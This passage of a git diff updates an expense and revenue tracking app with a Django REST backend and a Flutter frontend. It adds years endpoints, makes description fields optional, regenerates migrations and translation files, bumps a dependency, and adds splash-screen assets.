b\/backend\/djangorest\/custom_auth\/migrations\/0001_initial.py\nindex 5980e9a..c76cf82 100644\n--- a\/backend\/djangorest\/custom_auth\/migrations\/0001_initial.py\n+++ b\/backend\/djangorest\/custom_auth\/migrations\/0001_initial.py\n@@ -1,4 +1,4 @@\n-# Generated by Django 4.0.7 on 2022-10-22 21:39\n+# Generated by Django 4.0.8 on 2022-12-08 11:56\n \n import custom_auth.models\n import django.contrib.auth.validators\n@@ -14,8 +14,8 @@ class Migration(migrations.Migration):\n     initial = True\n \n     dependencies = [\n-        ('auth', '0012_alter_user_first_name_max_length'),\n         ('coin', '0001_initial'),\n+        ('auth', '0012_alter_user_first_name_max_length'),\n     ]\n \n     operations = [\ndiff --git a\/backend\/djangorest\/expense\/api\/urls.py b\/backend\/djangorest\/expense\/api\/urls.py\nindex e62c6ab..4810705 100644\n--- a\/backend\/djangorest\/expense\/api\/urls.py\n+++ b\/backend\/djangorest\/expense\/api\/urls.py\n@@ -2,7 +2,8 @@\n from expense.api.views import (\n     ExpenseView, \n     ExpenseTypeRetrieveView, \n-    ExpenseTypeListView\n+    ExpenseTypeListView,\n+    EspenseYearsRetrieveView\n )\n from rest_framework import routers\n \n@@ -14,5 +15,6 @@\n urlpatterns = [\n     path(\"expense\/type\/<str:pk>\", ExpenseTypeRetrieveView.as_view(), name='exp_type_get'),\n     path(\"expense\/type\", ExpenseTypeListView.as_view(), name='exp_type_list'),\n+    path(\"expense\/years\", EspenseYearsRetrieveView.as_view(), name='exp_years'),\n     path(\"\", include(router.urls)),\n ]\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/expense\/api\/views.py b\/backend\/djangorest\/expense\/api\/views.py\nindex 6021eea..f563030 100644\n--- a\/backend\/djangorest\/expense\/api\/views.py\n+++ b\/backend\/djangorest\/expense\/api\/views.py\n@@ -18,6 +18,10 @@\n from django.utils.decorators import method_decorator\n from django.views.decorators.cache import cache_page\n from django.views.decorators.vary import vary_on_headers\n+from rest_framework.views import APIView\n+from rest_framework import generics\n+from rest_framework.response import Response\n+from datetime import date\n \n \n class ExpenseTypeRetrieveView(generics.RetrieveAPIView):\n@@ -159,4 +163,24 @@ def perform_destroy(self, instance):\n             - converted_quantity, owner,\n             instance.date.year, instance.date.month, False\n         )\n-        instance.delete()\n\\ No newline at end of file\n+        instance.delete()\n+\n+class EspenseYearsRetrieveView(APIView):\n+    permission_classes = (IsCurrentVerifiedUser,)\n+    \n+    @method_decorator(cache_page(60))\n+    @method_decorator(vary_on_headers(\"Authorization\"))\n+    def get(self, request, format=None):\n+        \"\"\"\n+        This view will be cached for 1 minute\n+        \"\"\"\n+        expenses = list(Expense.objects.all())\n+        if expenses:\n+            return Response(\n+                data={\"years\": list(set([\n+                    exp.date.year for exp in expenses\n+                ]))},\n+            )\n+        return Response(\n+            data={\"years\": [date.today().year]},\n+        )\ndiff --git a\/backend\/djangorest\/expense\/migrations\/0001_initial.py b\/backend\/djangorest\/expense\/migrations\/0001_initial.py\nindex fe5a7d8..5f15a57 100644\n--- a\/backend\/djangorest\/expense\/migrations\/0001_initial.py\n+++ b\/backend\/djangorest\/expense\/migrations\/0001_initial.py\n@@ -1,4 +1,4 @@\n-# Generated by Django 4.0.7 on 2022-10-22 21:39\n+# Generated by Django 4.0.8 on 2022-12-08 11:56\n \n from django.conf import settings\n import django.core.validators\n@@ -11,8 +11,8 @@ class Migration(migrations.Migration):\n     initial = True\n \n     dependencies = [\n-        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n         ('coin', '0001_initial'),\n+        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n     ]\n \n     operations = [\n@@ -33,7 +33,7 @@ class Migration(migrations.Migration):\n             fields=[\n                 ('id', models.BigAutoField(editable=False, primary_key=True, serialize=False)),\n                 ('name', models.CharField(max_length=40, verbose_name='name')),\n-                ('description', models.CharField(default='', max_length=2000, verbose_name='description')),\n+                ('description', models.CharField(blank=True, default='', max_length=2000, verbose_name='description')),\n                 ('quantity', models.FloatField(validators=[django.core.validators.MinValueValidator(0.0)], verbose_name='quantity')),\n                 ('date', models.DateField(verbose_name='date')),\n                 ('created', models.DateTimeField(auto_now_add=True)),\ndiff --git a\/backend\/djangorest\/expense\/tests\/test_logic.py b\/backend\/djangorest\/expense\/tests\/test_logic.py\nindex 13174ea..e216e00 100644\n--- a\/backend\/djangorest\/expense\/tests\/test_logic.py\n+++ b\/backend\/djangorest\/expense\/tests\/test_logic.py\n@@ -60,7 +60,7 @@ def authenticate_user(self, credentials):\n     def get_expense_data(self):\n         return {\n             'name': 'Test name',\n-            'description': 'Test description',\n+            'description': '',\n             'quantity': 2.0,\n             'coin_type': self.coin_type.code,\n             'exp_type': self.exp_type.name,\ndiff --git a\/backend\/djangorest\/frontend_version\/api\/views.py b\/backend\/djangorest\/frontend_version\/api\/views.py\nindex 87881f9..2c4cd8e 100644\n--- a\/backend\/djangorest\/frontend_version\/api\/views.py\n+++ b\/backend\/djangorest\/frontend_version\/api\/views.py\n@@ -20,12 +20,12 @@ def get(self, request, format=None):\n         try:\n             return Response(\n                 data= {\n-                    'version': FrontendVersion.objects.last().version\n+                    'version': FrontendVersion.objects.first().version\n                 }\n             )\n         except:\n             return Response(\n                 data= {\n-                    'version': \"0.0.1\"\n+                    'version': \"0.0.3\"\n                 }\n             )\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/frontend_version\/migrations\/0001_initial.py b\/backend\/djangorest\/frontend_version\/migrations\/0001_initial.py\nindex a16f908..bb2a556 100644\n--- a\/backend\/djangorest\/frontend_version\/migrations\/0001_initial.py\n+++ b\/backend\/djangorest\/frontend_version\/migrations\/0001_initial.py\n@@ -1,4 +1,4 @@\n-# Generated by Django 4.0.7 on 2022-10-22 21:39\n+# Generated by Django 4.0.8 on 2022-12-08 11:56\n \n from django.db import migrations, models\n \ndiff --git a\/backend\/djangorest\/locale\/en\/LC_MESSAGES\/django.mo b\/backend\/djangorest\/locale\/en\/LC_MESSAGES\/django.mo\nindex ff276b8..8e6dfc8 100644\nBinary files a\/backend\/djangorest\/locale\/en\/LC_MESSAGES\/django.mo and b\/backend\/djangorest\/locale\/en\/LC_MESSAGES\/django.mo differ\ndiff --git a\/backend\/djangorest\/locale\/en\/LC_MESSAGES\/django.po b\/backend\/djangorest\/locale\/en\/LC_MESSAGES\/django.po\nindex de093c5..44e26d9 100644\n--- a\/backend\/djangorest\/locale\/en\/LC_MESSAGES\/django.po\n+++ b\/backend\/djangorest\/locale\/en\/LC_MESSAGES\/django.po\n@@ -8,7 +8,7 @@ msgid \"\"\n msgstr \"\"\n \"Project-Id-Version: PACKAGE VERSION\\n\"\n \"Report-Msgid-Bugs-To: \\n\"\n-\"POT-Creation-Date: 2022-11-07 16:07+0100\\n\"\n+\"POT-Creation-Date: 2022-12-08 11:31+0100\\n\"\n \"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\\n\"\n \"Last-Translator: FULL NAME <EMAIL@ADDRESS>\\n\"\n \"Language-Team: LANGUAGE <LL@li.org>\\n\"\n@@ -55,8 +55,8 @@ msgid \"gross quantity\"\n msgstr \"gross quantity\"\n \n #: .\\balance\\models.py:68\n-msgid \"net quantity\"\n-msgstr \"net quantity\"\n+msgid \"expected quantity\"\n+msgstr \"expected quantity\"\n \n #: .\\balance\\models.py:87\n msgid \"Date balance\"\n@@ -146,75 +146,75 @@ msgstr \"English\"\n msgid \"Spanish\"\n msgstr \"Spanish\"\n \n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:22\n-msgid \"No invitation code stored\"\n-msgstr \"No invitation code stored\"\n-\n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:25\n-msgid \"Unverified email\"\n-msgstr \"Unverified email\"\n-\n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:39\n-msgid \"No active account found with the given credentials\"\n-msgstr \"No active account found with the given credentials\"\n-\n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:46\n-msgid \"Invalid refresh token\"\n-msgstr \"Invalid refresh token\"\n-\n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:73\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:190\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:28\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:96\n msgid \"Code has already been sent, wait {} seconds\"\n msgstr \"Code has already been sent, wait {} seconds\"\n \n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:105\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:219\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:60\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:125\n msgid \"No code sent\"\n msgstr \"No code sent\"\n \n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:110\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:224\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:65\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:130\n msgid \"Code is no longer valid\"\n msgstr \"Code is no longer valid\"\n \n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:112\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:227\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:67\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:133\n msgid \"Invalid code\"\n msgstr \"Invalid code\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:31\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:87\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:118\n+#: .\\custom_auth\\api\\serializers\\utils.py:12\n+msgid \"User not found\"\n+msgstr \"User not found\"\n+\n+#: .\\custom_auth\\api\\serializers\\jwt_serializers.py:15\n+msgid \"No invitation code stored\"\n+msgstr \"No invitation code stored\"\n+\n+#: .\\custom_auth\\api\\serializers\\jwt_serializers.py:18\n+msgid \"Unverified email\"\n+msgstr \"Unverified email\"\n+\n+#: .\\custom_auth\\api\\serializers\\jwt_serializers.py:32\n+msgid \"No active account found with the given credentials\"\n+msgstr \"No active account found with the given credentials\"\n+\n+#: .\\custom_auth\\api\\serializers\\jwt_serializers.py:39\n+msgid \"Invalid refresh token\"\n+msgstr \"Invalid refresh token\"\n+\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:17\n msgid \"Invitation code not found\"\n msgstr \"Invitation code not found\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:33\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:19\n msgid \"Invalid invitation code\"\n msgstr \"Invalid invitation code\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:42\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:28\n msgid \"Password fields do not match\"\n msgstr \"Password fields do not match\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:45\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:31\n #: .\\custom_auth\\models.py:175\n msgid \"Password cannot match other profile data\"\n msgstr \"Password cannot match other profile data\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:94\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:85\n #: .\\custom_auth\\models.py:172\n msgid \"Language not supported\"\n msgstr \"Language not supported\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:106\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:97\n #: .\\custom_auth\\models.py:178\n msgid \"Username and email can not be the same\"\n msgstr \"Username and email can not be the same\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:181\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:212\n-#: .\\custom_auth\\api\\serializers\\utils.py:12\n-msgid \"User not found\"\n-msgstr \"User not found\"\n-\n #: .\\custom_auth\\api\\serializers\\utils.py:15\n msgid \"User already verified\"\n msgstr \"User already verified\"\ndiff --git a\/backend\/djangorest\/locale\/es\/LC_MESSAGES\/django.mo b\/backend\/djangorest\/locale\/es\/LC_MESSAGES\/django.mo\nindex 8261022..71679e8 100644\nBinary files a\/backend\/djangorest\/locale\/es\/LC_MESSAGES\/django.mo and b\/backend\/djangorest\/locale\/es\/LC_MESSAGES\/django.mo differ\ndiff --git a\/backend\/djangorest\/locale\/es\/LC_MESSAGES\/django.po b\/backend\/djangorest\/locale\/es\/LC_MESSAGES\/django.po\nindex da7288f..da2c2dd 100644\n--- a\/backend\/djangorest\/locale\/es\/LC_MESSAGES\/django.po\n+++ b\/backend\/djangorest\/locale\/es\/LC_MESSAGES\/django.po\n@@ -8,7 +8,7 @@ msgid \"\"\n msgstr \"\"\n \"Project-Id-Version: PACKAGE VERSION\\n\"\n \"Report-Msgid-Bugs-To: \\n\"\n-\"POT-Creation-Date: 2022-11-07 16:07+0100\\n\"\n+\"POT-Creation-Date: 2022-12-08 11:31+0100\\n\"\n \"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\\n\"\n \"Last-Translator: FULL NAME <EMAIL@ADDRESS>\\n\"\n \"Language-Team: LANGUAGE <LL@li.org>\\n\"\n@@ -55,8 +55,8 @@ msgid \"gross quantity\"\n msgstr \"cantidad bruta\"\n \n #: .\\balance\\models.py:68\n-msgid \"net quantity\"\n-msgstr \"cantidad neta\"\n+msgid \"expected quantity\"\n+msgstr \"cantidad esperada\"\n \n #: .\\balance\\models.py:87\n msgid \"Date balance\"\n@@ -146,75 +146,75 @@ msgstr \"Ingl\u00e9s\"\n msgid \"Spanish\"\n msgstr \"Espa\u00f1ol\"\n \n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:22\n-msgid \"No invitation code stored\"\n-msgstr \"No hay c\u00f3digo de invitaci\u00f3n almacenado\"\n-\n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:25\n-msgid \"Unverified email\"\n-msgstr \"Correo no verificado\"\n-\n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:39\n-msgid \"No active account found with the given credentials\"\n-msgstr \"No se encontr\u00f3 ninguna cuenta activa con las credenciales dadas\"\n-\n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:46\n-msgid \"Invalid refresh token\"\n-msgstr \"Token de actualizaci\u00f3n no v\u00e1lido\"\n-\n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:73\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:190\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:28\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:96\n msgid \"Code has already been sent, wait {} seconds\"\n msgstr \"El c\u00f3digo se ha enviado, espere {} segundos\"\n \n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:105\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:219\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:60\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:125\n msgid \"No code sent\"\n msgstr \"Ning\u00fan c\u00f3digo enviado\"\n \n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:110\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:224\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:65\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:130\n msgid \"Code is no longer valid\"\n msgstr \"El c\u00f3digo ya no es v\u00e1lido\"\n \n-#: .\\custom_auth\\api\\serializers\\jwt_code_serializers.py:112\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:227\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:67\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:133\n msgid \"Invalid code\"\n msgstr \"C\u00f3digo invalido\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:31\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:87\n+#: .\\custom_auth\\api\\serializers\\code_serializers.py:118\n+#: .\\custom_auth\\api\\serializers\\utils.py:12\n+msgid \"User not found\"\n+msgstr \"Usuario no encontrado\"\n+\n+#: .\\custom_auth\\api\\serializers\\jwt_serializers.py:15\n+msgid \"No invitation code stored\"\n+msgstr \"No hay c\u00f3digo de invitaci\u00f3n almacenado\"\n+\n+#: .\\custom_auth\\api\\serializers\\jwt_serializers.py:18\n+msgid \"Unverified email\"\n+msgstr \"Correo no verificado\"\n+\n+#: .\\custom_auth\\api\\serializers\\jwt_serializers.py:32\n+msgid \"No active account found with the given credentials\"\n+msgstr \"No se encontr\u00f3 ninguna cuenta activa con las credenciales dadas\"\n+\n+#: .\\custom_auth\\api\\serializers\\jwt_serializers.py:39\n+msgid \"Invalid refresh token\"\n+msgstr \"Token de actualizaci\u00f3n no v\u00e1lido\"\n+\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:17\n msgid \"Invitation code not found\"\n msgstr \"C\u00f3digo de invitaci\u00f3n no encontrado\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:33\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:19\n msgid \"Invalid invitation code\"\n msgstr \"C\u00f3digo de invitaci\u00f3n no v\u00e1lido\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:42\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:28\n msgid \"Password fields do not match\"\n msgstr \"Los campos de contrase\u00f1a no coinciden\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:45\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:31\n #: .\\custom_auth\\models.py:175\n msgid \"Password cannot match other profile data\"\n msgstr \"La contrase\u00f1a no puede coincidir con otro dato del perfil\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:94\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:85\n #: .\\custom_auth\\models.py:172\n msgid \"Language not supported\"\n msgstr \"Lenguaje no soportado\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:106\n+#: .\\custom_auth\\api\\serializers\\user_serializers.py:97\n #: .\\custom_auth\\models.py:178\n msgid \"Username and email can not be the same\"\n msgstr \"Nombre de usuario y correo electr\u00f3nico no pueden contener lo mismo\"\n \n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:181\n-#: .\\custom_auth\\api\\serializers\\user_serializers.py:212\n-#: .\\custom_auth\\api\\serializers\\utils.py:12\n-msgid \"User not found\"\n-msgstr \"Usuario no encontrado\"\n-\n #: .\\custom_auth\\api\\serializers\\utils.py:15\n msgid \"User already verified\"\n msgstr \"Usuario ya verificado\"\ndiff --git a\/backend\/djangorest\/requirements.txt b\/backend\/djangorest\/requirements.txt\nindex 3ed2bcb..5448ff7 100644\n--- a\/backend\/djangorest\/requirements.txt\n+++ b\/backend\/djangorest\/requirements.txt\n@@ -7,7 +7,7 @@ django-cors-headers==3.13.0\n drf-yasg==1.21.3\n djangorestframework-simplejwt==5.2.0\n PyJWT==2.4.0\n-Pillow==9.2.0\n+Pillow==9.3.0\n celery==5.2.7\n django-celery-results==2.4.0\n django-celery-beat==2.3.0\ndiff --git a\/backend\/djangorest\/revenue\/api\/urls.py b\/backend\/djangorest\/revenue\/api\/urls.py\nindex aa1234d..17975ac 100644\n--- a\/backend\/djangorest\/revenue\/api\/urls.py\n+++ b\/backend\/djangorest\/revenue\/api\/urls.py\n@@ -2,7 +2,8 @@\n from revenue.api.views import (\n     RevenueView, \n     RevenueTypeRetrieveView, \n-    RevenueTypeListView\n+    RevenueTypeListView,\n+    RevenueYearsRetrieveView\n )\n from rest_framework import routers\n \n@@ -14,5 +15,6 @@\n urlpatterns = [\n     path(\"revenue\/type\/<str:pk>\", RevenueTypeRetrieveView.as_view(), name='rev_type_get'),\n     path(\"revenue\/type\", RevenueTypeListView.as_view(), name='rev_type_list'),\n+    path(\"revenue\/years\", RevenueYearsRetrieveView.as_view(), name='rev_years'),\n     path(\"\", include(router.urls)),\n ]\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/revenue\/api\/views.py b\/backend\/djangorest\/revenue\/api\/views.py\nindex 0172f1e..e4b19f9 100644\n--- a\/backend\/djangorest\/revenue\/api\/views.py\n+++ b\/backend\/djangorest\/revenue\/api\/views.py\n@@ -18,6 +18,10 @@\n from django.utils.decorators import method_decorator\n from django.views.decorators.cache import cache_page\n from django.views.decorators.vary import vary_on_headers\n+from rest_framework.views import APIView\n+from rest_framework import generics\n+from rest_framework.response import Response\n+from datetime import date\n \n \n class RevenueTypeRetrieveView(generics.RetrieveAPIView):\n@@ -161,4 +165,24 @@ def perform_destroy(self, instance):\n             - converted_quantity, owner,\n             instance.date.year, instance.date.month, True\n         )\n-        instance.delete()\n\\ No newline at end of file\n+        instance.delete()\n+\n+class RevenueYearsRetrieveView(APIView):\n+    permission_classes = (IsCurrentVerifiedUser,)\n+    \n+    @method_decorator(cache_page(60))\n+    @method_decorator(vary_on_headers(\"Authorization\"))\n+    def get(self, request, format=None):\n+        \"\"\"\n+        This view will be cached for 1 minute\n+        \"\"\"\n+        revenues = list(Revenue.objects.all())\n+        if revenues:\n+            return Response(\n+                data={\"years\": list(set([\n+                    rev.date.year for rev in revenues\n+                ]))},\n+            )\n+        return Response(\n+            data={\"years\": [date.today().year]},\n+        )\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/revenue\/migrations\/0001_initial.py b\/backend\/djangorest\/revenue\/migrations\/0001_initial.py\nindex 05c3b4a..cefc6e1 100644\n--- a\/backend\/djangorest\/revenue\/migrations\/0001_initial.py\n+++ b\/backend\/djangorest\/revenue\/migrations\/0001_initial.py\n@@ -1,4 +1,4 @@\n-# Generated by Django 4.0.7 on 2022-10-22 21:39\n+# Generated by Django 4.0.8 on 2022-12-08 11:56\n \n from django.conf import settings\n import django.core.validators\n@@ -11,8 +11,8 @@ class Migration(migrations.Migration):\n     initial = True\n \n     dependencies = [\n-        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n         ('coin', '0001_initial'),\n+        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n     ]\n \n     operations = [\n@@ -33,7 +33,7 @@ class Migration(migrations.Migration):\n             fields=[\n                 ('id', models.BigAutoField(editable=False, primary_key=True, serialize=False)),\n                 ('name', models.CharField(max_length=40, verbose_name='name')),\n-                ('description', models.CharField(default='', max_length=2000, verbose_name='description')),\n+                ('description', models.CharField(blank=True, default='', max_length=2000, verbose_name='description')),\n                 ('quantity', models.FloatField(validators=[django.core.validators.MinValueValidator(0.0)], verbose_name='quantity')),\n                 ('date', models.DateField(verbose_name='date')),\n                 ('created', models.DateTimeField(auto_now_add=True)),\ndiff --git a\/backend\/djangorest\/revenue\/tests\/test_logic.py b\/backend\/djangorest\/revenue\/tests\/test_logic.py\nindex 8df3cc2..c481d15 100644\n--- a\/backend\/djangorest\/revenue\/tests\/test_logic.py\n+++ b\/backend\/djangorest\/revenue\/tests\/test_logic.py\n@@ -60,7 +60,7 @@ def authenticate_user(self, credentials):\n     def get_revenue_data(self):\n         return {\n             'name': 'Test name',\n-            'description': 'Test description',\n+            'description': '',\n             'quantity': 2.0,\n             'coin_type': self.coin_type.code,\n             'rev_type': self.rev_type.name,\ndiff --git a\/frontend\/flutter\/README.md b\/frontend\/flutter\/README.md\nindex 9f021f2..df4c10a 100644\n--- a\/frontend\/flutter\/README.md\n+++ b\/frontend\/flutter\/README.md\n@@ -71,3 +71,9 @@ flutter pub run flutter_launcher_icons:main\n ~~~bash\n flutter pub run build_runner build --delete-conflicting-outputs\n ~~~\n+\n+* Generate splash screen:\n+\n+~~~bash\n+flutter pub run flutter_native_splash:create\n+~~~\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-hdpi\/android12splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-hdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..52e7286\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-hdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-hdpi\/splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-hdpi\/splash.png\nnew file mode 100644\nindex 0000000..52e7286\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-hdpi\/splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-mdpi\/android12splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-mdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..8534598\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-mdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-mdpi\/splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-mdpi\/splash.png\nnew file mode 100644\nindex 0000000..8534598\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-mdpi\/splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-hdpi\/android12splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-hdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..52e7286\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-hdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-mdpi\/android12splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-mdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..8534598\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-mdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-xhdpi\/android12splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-xhdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..2311b33\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-xhdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-xxhdpi\/android12splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-xxhdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..22be0fe\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-xxhdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-xxxhdpi\/android12splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-xxxhdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..fc566c5\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-night-xxxhdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-v21\/background.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-v21\/background.png\nnew file mode 100644\nindex 0000000..adf9c61\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-v21\/background.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-v21\/launch_background.xml b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-v21\/launch_background.xml\nindex f74085f..3cc4948 100644\n--- a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-v21\/launch_background.xml\n+++ b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-v21\/launch_background.xml\n@@ -1,12 +1,9 @@\n <?xml version=\"1.0\" encoding=\"utf-8\"?>\n-<!-- Modify this file to customize your launch splash screen -->\n <layer-list xmlns:android=\"http:\/\/schemas.android.com\/apk\/res\/android\">\n-    <item android:drawable=\"?android:colorBackground\" \/>\n-\n-    <!-- You can insert your own image assets here -->\n-    <!-- <item>\n-        <bitmap\n-            android:gravity=\"center\"\n-            android:src=\"@mipmap\/launch_image\" \/>\n-    <\/item> -->\n+    <item>\n+        <bitmap android:gravity=\"fill\" android:src=\"@drawable\/background\"\/>\n+    <\/item>\n+    <item>\n+        <bitmap android:gravity=\"center\" android:src=\"@drawable\/splash\"\/>\n+    <\/item>\n <\/layer-list>\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xhdpi\/android12splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xhdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..2311b33\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xhdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xhdpi\/splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xhdpi\/splash.png\nnew file mode 100644\nindex 0000000..2311b33\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xhdpi\/splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxhdpi\/android12splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxhdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..22be0fe\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxhdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxhdpi\/splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxhdpi\/splash.png\nnew file mode 100644\nindex 0000000..22be0fe\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxhdpi\/splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxxhdpi\/android12splash.png 